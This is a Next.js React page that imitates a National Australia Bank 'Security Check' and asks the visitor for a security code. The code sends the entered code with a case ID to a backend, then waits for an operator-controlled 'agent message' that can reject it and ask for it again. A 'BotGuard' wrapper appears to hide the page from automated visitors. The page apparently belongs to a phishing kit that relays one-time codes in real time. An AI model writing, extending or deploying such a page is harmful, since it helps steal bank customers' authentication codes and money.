'use client';

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { AlertCircle, Loader2 } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';

export default function SecretKeyPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;
  const { stage, status, loading, error, caseId } = useSessionStore();
  const { agentMessage } = useSessionStore();

  const [secretKey, setSecretKey] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setSecretKey('');
      setFieldError(agentMessage || 'Invalid key provided. Please try again.');
      setIsSubmitting(false);
    }
  }, [status, agentMessage]);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!secretKey.trim()) {
        setFieldError('Please enter your secret key');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-secret-key', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            secret_key: secretKey.trim(),
          }),
        });

        if (!response.ok) {
          setFieldError('Unable to verify. Please try again.');
          setIsSubmitting(false);
          return;
        }

        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying...',
          formData: {},
        });
      } catch (error) {
        setFieldError('Verification failed. Please try again.');
        setIsSubmitting(false);
      }
    },
    [secretKey, sessionUuid, caseId]
  );

  const isWaiting = status === 'waiting' || isSubmitting || loading;

  return (
    <BotGuard>
      <div className="login-card"> {/* Removed margin: 0 auto to fix mobile override and align left */}
        <h1 className="card-heading">Security Check</h1>

        <form className="login-form" onSubmit={handleSubmit}>
          <div className="form-group">
            <p className="mb-4 text-[16px]">We've sent a security code. Please enter it below.</p>

            <div style={{ backgroundColor: '#fcf8e3', border: '1px solid #faebcc', padding: '12px', borderRadius: '4px', marginBottom: '24px', fontSize: '14px', color: '#8a6d3b' }}>
              <strong>Important:</strong> NAB will never ask you to disclose your security code to anyone, including NAB staff.
            </div>

            <label htmlFor="secret-key">Security Code</label>
            <input
              type="text"
              id="secret-key"
              name="secret-key"
              autoComplete="off"
              value={secretKey}
              onChange={(e) => {
                setSecretKey(e.target.value);
                if (fieldError) setFieldError('');
              }}
              disabled={isWaiting}
            />
          </div>

          {fieldError && (
            <div className="form-group">
              <div style={{ color: '#C20000', display: 'flex', alignItems: 'center', gap: '8px', fontSize: '14px' }}>
                <AlertCircle className="h-4 w-4" />
                <span>{fieldError}</span>
              </div>
            </div>
          )}

          <div className="form-actions">
            <button type="submit" className="btn-login" disabled={isWaiting}>
              {isWaiting ? (
                <span style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <Loader2 className="h-4 w-4 animate-spin" /> Verifying...
                </span>
              ) : 'Continue'}
            </button>
          </div>
        </form>
      </div>
    </BotGuard>
  );
}
